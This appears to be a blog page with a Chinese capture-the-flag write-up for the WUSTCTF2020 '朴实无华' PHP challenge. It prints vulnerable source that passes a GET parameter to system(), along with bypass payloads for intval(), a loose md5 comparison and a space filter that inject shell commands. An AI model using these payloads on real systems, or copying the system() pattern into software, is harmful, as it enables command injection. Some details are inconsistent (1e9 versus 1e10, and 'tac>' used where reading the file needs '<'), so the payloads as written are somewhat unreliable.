@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>20230622 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="(PHP中intval漏洞、$md5&#x3D;&#x3D;md5($md5)构造、过滤空格) [WUSTCTF2020]朴实无华 第一步进页面发现 12Hack meWarning: Cannot modify header information - headers already sent by (output started at &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php:3) in">
+<meta property="og:type" content="article">
+<meta property="og:title" content="20230622">
+<meta property="og:url" content="http://example.com/2023/06/22/20230622/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="(PHP中intval漏洞、$md5&#x3D;&#x3D;md5($md5)构造、过滤空格) [WUSTCTF2020]朴实无华 第一步进页面发现 12Hack meWarning: Cannot modify header information - headers already sent by (output started at &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php:3) in">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-06-22T14:51:35.000Z">
+<meta property="article:modified_time" content="2023-06-22T15:59:32.004Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-20230622" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/06/22/20230622/" class="article-date">
+  <time class="dt-published" datetime="2023-06-22T14:51:35.000Z" itemprop="datePublished">2023-06-22</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/unctf/">unctf</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      20230622
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="PHP中intval漏洞、-md5-x3D-x3D-md5-md5-构造、过滤空格-WUSTCTF2020-朴实无华"><a href="#PHP中intval漏洞、-md5-x3D-x3D-md5-md5-构造、过滤空格-WUSTCTF2020-朴实无华" class="headerlink" title="(PHP中intval漏洞、$md5&#x3D;&#x3D;md5($md5)构造、过滤空格) [WUSTCTF2020]朴实无华"></a>(PHP中intval漏洞、$md5&#x3D;&#x3D;md5($md5)构造、过滤空格) [WUSTCTF2020]朴实无华</h2><ol>
+<li><p>第一步进页面发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hack me</span><br><span class="line">Warning: Cannot modify header information - headers already sent by (output started at /var/www/html/index.php:3) in /var/www/html/index.php on line 4</span><br></pre></td></tr></table></figure>
+
+<p> 说明改动了消息头</p>
+</li>
+<li><p>Dirsearch扫一下目录进 <code>robots.txt</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /fAke_f1agggg.php</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>访问 <code>/fAke_f1agggg.php</code> </p>
+<p> 发现响应头中有如下信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Look_at_me</span><br><span class="line"></span><br><span class="line">/fl4g.php</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>访问 <code>fl4g.php</code> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Warning: Cannot modify header information - headers already sent by (output started at /var/www/html/fl4g.php:2) in /var/www/html/fl4g.php on line 3</span><br><span class="line">&lt;img src=&quot;/img.jpg&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">header(&#x27;Content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//level 1</span><br><span class="line">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;</span><br><span class="line">        echo &quot;鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;鍘婚潪娲插惂&quot;);</span><br><span class="line">&#125;</span><br><span class="line">//level 2</span><br><span class="line">if (isset($_GET[&#x27;md5&#x27;]))&#123;</span><br><span class="line">   $md5=$_GET[&#x27;md5&#x27;];</span><br><span class="line">   if ($md5==md5($md5))</span><br><span class="line">       echo &quot;鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.&lt;/br&gt;&quot;;</span><br><span class="line">   else</span><br><span class="line">       die(&quot;鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;鍘婚潪娲插惂&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//get flag</span><br><span class="line">if (isset($_GET[&#x27;get_flag&#x27;]))&#123;</span><br><span class="line">    $get_flag = $_GET[&#x27;get_flag&#x27;];</span><br><span class="line">    if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);</span><br><span class="line">        echo &quot;鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.&lt;/br&gt;&quot;;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;蹇埌闈炴床浜�&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;鍘婚潪娲插惂&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">鍘婚潪娲插惂</span><br></pre></td></tr></table></figure>
+
+<p> 火狐修复字体后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Warning: Cannot modify header information - headers already sent by (output started at /var/www/html/fl4g.php:2) in /var/www/html/fl4g.php on line 3</span><br><span class="line">&lt;img src=&quot;/img.jpg&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">header(&#x27;Content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//level 1</span><br><span class="line">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;</span><br><span class="line">        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;金钱解决不了穷人的本质问题&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line">//level 2</span><br><span class="line">if (isset($_GET[&#x27;md5&#x27;]))&#123;</span><br><span class="line">   $md5=$_GET[&#x27;md5&#x27;];</span><br><span class="line">   if ($md5==md5($md5))</span><br><span class="line">       echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;</span><br><span class="line">   else</span><br><span class="line">       die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//get flag</span><br><span class="line">if (isset($_GET[&#x27;get_flag&#x27;]))&#123;</span><br><span class="line">    $get_flag = $_GET[&#x27;get_flag&#x27;];</span><br><span class="line">    if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);</span><br><span class="line">        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;快到非洲了&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">去非洲吧</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>绕过 <code>intval()</code> 函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">之前的题目里有对intval()的利用，当里面是科学计数法的时候会只去前面的整数</span><br><span class="line">intval(1e9)=1</span><br><span class="line">然而+1会对里面的值进行转换，就不是科学计数法了</span><br><span class="line">所以可以令num=1e9</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>绕过 <code>md5</code> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">md5的绕过，在弱类型比较下值本身与其md5后的值相同，也需要利用科学计数法的漏洞</span><br><span class="line">0e任何数=0  也就是使该值经过md5后仍然是0e开头的值即可，可以编写脚本，我直接从网上找到值，可以令md5=0e215962017</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>绕过空格</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get_flag=ls</span><br><span class="line"> get_flag=tac&gt;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=1e10&amp;md5=0e215962017&amp;get_flag=ls</span><br></pre></td></tr></table></figure></li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/06/22/20230622/" data-id="clj7bv0370000akuzbkh8f9h4" data-title="20230622" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2023/06/21/20230621/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">20230621</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTFshow/">CTFshow</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/SCTF/">SCTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/SYCTF2023/">SYCTF2023</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/buuctf/">buuctf</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/ciscn/">ciscn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/shaanxi/">shaanxi</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/unctf/">unctf</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/06/22/20230622/">20230622</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/21/20230621/">20230621</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/20/20230620/">20230620</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/19/20230619/">20230619</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/17/20230616/">20230616</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
